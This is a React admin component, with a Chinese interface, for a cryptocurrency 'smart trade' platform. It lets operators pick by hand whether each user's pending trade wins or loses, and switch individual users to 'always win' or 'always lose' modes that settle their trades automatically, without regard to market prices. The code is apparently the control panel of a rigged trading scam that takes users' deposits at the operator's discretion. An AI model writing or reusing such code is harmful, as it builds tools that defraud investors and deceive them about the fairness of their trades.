import { useState, useEffect } from 'react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from '@/components/ui/table';
import { Badge } from '@/components/ui/badge';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { toast } from 'sonner';
import { TrendingUp, TrendingDown, CheckCircle, XCircle, RefreshCw, Settings2 } from 'lucide-react';
import { supabase } from '@/integrations/supabase/client';

interface TradeWithUser {
  id: string;
  user_id: string;
  amount: number;
  currency: string;
  fee: number | null;
  note: string | null;
  status: string;
  created_at: string;
  username?: string;
  email?: string;
}

interface UserTradeConfig {
  user_id: string;
  username: string;
  email: string;
  trade_mode: 'manual' | 'always_win' | 'always_lose';
}

const AdminSmartTrades = () => {
  const [trades, setTrades] = useState<TradeWithUser[]>([]);
  const [userConfigs, setUserConfigs] = useState<UserTradeConfig[]>([]);
  const [isLoading, setIsLoading] = useState(true);
  const [processingId, setProcessingId] = useState<string | null>(null);
  const [updatingUserId, setUpdatingUserId] = useState<string | null>(null);

  const fetchPendingTrades = async () => {
    setIsLoading(true);
    try {
      // Fetch pending trade transactions
      const { data: tradesData, error } = await supabase
        .from('transactions')
        .select('*')
        .eq('type', 'trade')
        .eq('status', 'pending')
        .order('created_at', { ascending: false });

      if (error) throw error;

      // Fetch usernames for each trade
      if (tradesData && tradesData.length > 0) {
        const userIds = [...new Set(tradesData.map(t => t.user_id))];
        const { data: profiles } = await supabase
          .from('profiles')
          .select('user_id, username, email')
          .in('user_id', userIds);

        const profileMap: Record<string, { username: string; email: string }> = {};
        profiles?.forEach(p => {
          profileMap[p.user_id] = { 
            username: p.username || 'Unknown',
            email: p.email || ''
          };
        });

        const tradesWithUsers = tradesData.map(t => ({
          ...t,
          username: profileMap[t.user_id]?.username || 'Unknown',
          email: profileMap[t.user_id]?.email || '',
        }));

        setTrades(tradesWithUsers);
      } else {
        setTrades([]);
      }
    } catch (error: any) {
      console.error('Failed to fetch trades:', error);
      toast.error('加载交易失败');
    } finally {
      setIsLoading(false);
    }
  };

  const fetchUserConfigs = async () => {
    try {
      // Fetch all users who have made trades
      const { data: profiles, error } = await supabase
        .from('profiles')
        .select('user_id, username, email');

      if (error) throw error;

      // Fetch trade mode configs from system_config
      const { data: configs } = await supabase
        .from('system_config')
        .select('key, value')
        .like('key', 'user_trade_mode_%');

      const modeMap: Record<string, string> = {};
      configs?.forEach(c => {
        const userId = c.key.replace('user_trade_mode_', '');
        modeMap[userId] = c.value;
      });

      const userConfigsList: UserTradeConfig[] = (profiles || []).map(p => ({
        user_id: p.user_id,
        username: p.username || 'Unknown',
        email: p.email || '',
        trade_mode: (modeMap[p.user_id] as 'manual' | 'always_win' | 'always_lose') || 'manual',
      }));

      setUserConfigs(userConfigsList);
    } catch (error: any) {
      console.error('Failed to fetch user configs:', error);
    }
  };

  useEffect(() => {
    fetchPendingTrades();
    fetchUserConfigs();
  }, []);

  const parseTradeNote = (note: string | null) => {
    if (!note) return { direction: 'unknown', symbol: 'unknown', price: 0, duration: 0 };
    
    // Parse note format: "Smart Trade: LONG BTC @ $96,969 for 5 min"
    const match = note.match(/Smart Trade: (LONG|SHORT) (\w+) @ \$([\d,]+(?:\.\d+)?) for (\d+) min/);
    if (match) {
      return {
        direction: match[1],
        symbol: match[2],
        price: parseFloat(match[3].replace(/,/g, '')),
        duration: parseInt(match[4]),
      };
    }
    return { direction: 'unknown', symbol: 'unknown', price: 0, duration: 0 };
  };

  const handleSetResult = async (trade: TradeWithUser, result: 'win' | 'loss') => {
    setProcessingId(trade.id);
    try {
      const tradeInfo = parseTradeNote(trade.note);
      
      // Calculate profit rate based on duration
      const profitRates: Record<number, number> = { 1: 0.10, 3: 0.20, 5: 0.30, 15: 0.40 };
      const profitRate = profitRates[tradeInfo.duration] || 0.30;
      
      if (result === 'win') {
        // User wins: return amount + profit
        const profit = trade.amount * profitRate;
        const totalReturn = trade.amount + profit;
        
        // Use the secure admin function to add balance
        const { data: newBalance, error: balanceError } = await supabase
          .rpc('admin_add_balance', {
            _user_id: trade.user_id,
            _currency: 'USDT',
            _amount: totalReturn
          });

        if (balanceError) {
          console.error('Balance update error:', balanceError);
          throw new Error('更新余额失败: ' + balanceError.message);
        }

        // Update transaction status
        const { error: txError } = await supabase
          .from('transactions')
          .update({ 
            status: 'completed',
            note: `${trade.note} | Result: WIN | Profit: +${profit.toFixed(2)} USDT`
          })
          .eq('id', trade.id);

        if (txError) throw txError;

        toast.success(`已设为盈利，用户获得 本金${trade.amount.toFixed(2)} + 利润${profit.toFixed(2)} = ${totalReturn.toFixed(2)} USDT`);
      } else {
        // User loses: amount already deducted, just update status
        const { error: txError } = await supabase
          .from('transactions')
          .update({ 
            status: 'completed',
            note: `${trade.note} | Result: LOSS | Lost: -${trade.amount.toFixed(2)} USDT`
          })
          .eq('id', trade.id);

        if (txError) throw txError;

        toast.success(`已设为亏损，用户损失 ${trade.amount.toFixed(2)} USDT`);
      }

      // Refresh trades list
      fetchPendingTrades();
    } catch (error: any) {
      console.error('Failed to set trade result:', error);
      toast.error(error.message || '设置结果失败');
    } finally {
      setProcessingId(null);
    }
  };

  const handleSetUserTradeMode = async (userId: string, mode: 'manual' | 'always_win' | 'always_lose') => {
    setUpdatingUserId(userId);
    try {
      const key = `user_trade_mode_${userId}`;
      
      const { error } = await supabase
        .from('system_config')
        .upsert(
          { 
            key, 
            value: mode,
            description: `用户交易模式设置`
          },
          { onConflict: 'key' }
        );

      if (error) throw error;

      // Update local state
      setUserConfigs(prev => prev.map(u => 
        u.user_id === userId ? { ...u, trade_mode: mode } : u
      ));

      const modeText = mode === 'always_win' ? '持续盈利' : mode === 'always_lose' ? '持续亏损' : '手动控制';
      toast.success(`已设置用户交易模式为: ${modeText}`);

      // If not manual, process all pending trades for this user
      if (mode !== 'manual') {
        const userPendingTrades = trades.filter(t => t.user_id === userId);
        for (const trade of userPendingTrades) {
          await handleSetResult(trade, mode === 'always_win' ? 'win' : 'loss');
        }
      }
    } catch (error: any) {
      console.error('Failed to set user trade mode:', error);
      toast.error(error.message || '设置失败');
    } finally {
      setUpdatingUserId(null);
    }
  };

  const formatDate = (dateString: string) => {
    return new Date(dateString).toLocaleString('zh-CN', {
      year: 'numeric',
      month: '2-digit',
      day: '2-digit',
      hour: '2-digit',
      minute: '2-digit',
    });
  };

  // Get users who have pending trades
  const usersWithPendingTrades = [...new Set(trades.map(t => t.user_id))];
  const relevantUserConfigs = userConfigs.filter(u => usersWithPendingTrades.includes(u.user_id));

  if (isLoading) {
    return (
      <Card>
        <CardContent className="py-8">
          <div className="flex items-center justify-center gap-2">
            <div className="w-4 h-4 border-2 border-primary border-t-transparent rounded-full animate-spin" />
            加载交易中...
          </div>
        </CardContent>
      </Card>
    );
  }

  return (
    <div className="space-y-6">
      {/* User Trade Mode Settings */}
      {relevantUserConfigs.length > 0 && (
        <Card>
          <CardHeader>
            <CardTitle className="flex items-center gap-2">
              <Settings2 className="w-5 h-5" />
              用户交易模式设置
            </CardTitle>
          </CardHeader>
          <CardContent>
            <div className="space-y-4">
              {relevantUserConfigs.map(user => (
                <div key={user.user_id} className="flex items-center justify-between p-4 bg-muted/50 rounded-lg">
                  <div>
                    <p className="font-medium">{user.username}</p>
                    <p className="text-sm text-muted-foreground">{user.email}</p>
                  </div>
                  <div className="flex items-center gap-2">
                    <Select
                      value={user.trade_mode}
                      onValueChange={(value: 'manual' | 'always_win' | 'always_lose') => 
                        handleSetUserTradeMode(user.user_id, value)
                      }
                      disabled={updatingUserId === user.user_id}
                    >
                      <SelectTrigger className="w-[140px]">
                        <SelectValue />
                      </SelectTrigger>
                      <SelectContent>
                        <SelectItem value="manual">手动控制</SelectItem>
                        <SelectItem value="always_win">持续盈利</SelectItem>
                        <SelectItem value="always_lose">持续亏损</SelectItem>
                      </SelectContent>
                    </Select>
                    {updatingUserId === user.user_id && (
                      <div className="w-4 h-4 border-2 border-primary border-t-transparent rounded-full animate-spin" />
                    )}
                  </div>
                </div>
              ))}
            </div>
            <p className="text-xs text-muted-foreground mt-4">
              设置"持续盈利"或"持续亏损"后，该用户的所有待处理交易将自动按设置结算，后续新交易也将自动处理。
            </p>
          </CardContent>
        </Card>
      )}

      {/* Pending Trades */}
      <Card>
        <CardHeader className="flex flex-row items-center justify-between">
          <CardTitle className="flex items-center gap-2">
            <TrendingUp className="w-5 h-5" />
            待处理智能交易
          </CardTitle>
          <Button variant="outline" size="sm" onClick={fetchPendingTrades}>
            <RefreshCw className="w-4 h-4 mr-1" />
            刷新
          </Button>
        </CardHeader>
        <CardContent>
          {trades.length === 0 ? (
            <div className="text-center py-8 text-muted-foreground">
              暂无待处理的智能交易
            </div>
          ) : (
            <div className="overflow-x-auto">
              <Table>
                <TableHeader>
                  <TableRow>
                    <TableHead>用户</TableHead>
                    <TableHead>方向</TableHead>
                    <TableHead>币种</TableHead>
                    <TableHead>金额</TableHead>
                    <TableHead>时长</TableHead>
                    <TableHead>开仓价</TableHead>
                    <TableHead>时间</TableHead>
                    <TableHead className="text-right">操作</TableHead>
                  </TableRow>
                </TableHeader>
                <TableBody>
                  {trades.map((trade) => {
                    const tradeInfo = parseTradeNote(trade.note);
                    const userConfig = userConfigs.find(u => u.user_id === trade.user_id);
                    const isAutoMode = userConfig?.trade_mode !== 'manual';
                    
                    return (
                      <TableRow key={trade.id}>
                        <TableCell>
                          <div>
                            <p className="font-medium">{trade.username}</p>
                            <p className="text-xs text-muted-foreground">{trade.email}</p>
                          </div>
                        </TableCell>
                        <TableCell>
                          <Badge variant={tradeInfo.direction === 'LONG' ? 'default' : 'destructive'}>
                            {tradeInfo.direction === 'LONG' ? (
                              <><TrendingUp className="w-3 h-3 mr-1" />做多</>
                            ) : (
                              <><TrendingDown className="w-3 h-3 mr-1" />做空</>
                            )}
                          </Badge>
                        </TableCell>
                        <TableCell>{tradeInfo.symbol}</TableCell>
                        <TableCell>{trade.amount.toFixed(2)} USDT</TableCell>
                        <TableCell>{tradeInfo.duration} 分钟</TableCell>
                        <TableCell>${tradeInfo.price.toLocaleString()}</TableCell>
                        <TableCell className="text-muted-foreground text-sm">
                          {formatDate(trade.created_at)}
                        </TableCell>
                        <TableCell className="text-right">
                          <div className="flex justify-end gap-2">
                            <Button
                              size="sm"
                              variant="outline"
                              className="text-green-600 border-green-600 hover:bg-green-600 hover:text-white"
                              onClick={() => handleSetResult(trade, 'win')}
                              disabled={processingId === trade.id}
                            >
                              {processingId === trade.id ? (
                                <div className="w-4 h-4 border-2 border-current border-t-transparent rounded-full animate-spin" />
                              ) : (
                                <>
                                  <CheckCircle className="w-4 h-4 mr-1" />
                                  盈利
                                </>
                              )}
                            </Button>
                            <Button
                              size="sm"
                              variant="outline"
                              className="text-red-600 border-red-600 hover:bg-red-600 hover:text-white"
                              onClick={() => handleSetResult(trade, 'loss')}
                              disabled={processingId === trade.id}
                            >
                              {processingId === trade.id ? (
                                <div className="w-4 h-4 border-2 border-current border-t-transparent rounded-full animate-spin" />
                              ) : (
                                <>
                                  <XCircle className="w-4 h-4 mr-1" />
                                  亏损
                                </>
                              )}
                            </Button>
                          </div>
                        </TableCell>
                      </TableRow>
                    );
                  })}
                </TableBody>
              </Table>
            </div>
          )}
          <p className="text-xs text-muted-foreground mt-4">
            在这里控制用户智能交易的最终结果。盈利将返还本金加利润，亏损则本金已被扣除。
          </p>
        </CardContent>
      </Card>
    </div>
  );
};

export default AdminSmartTrades;
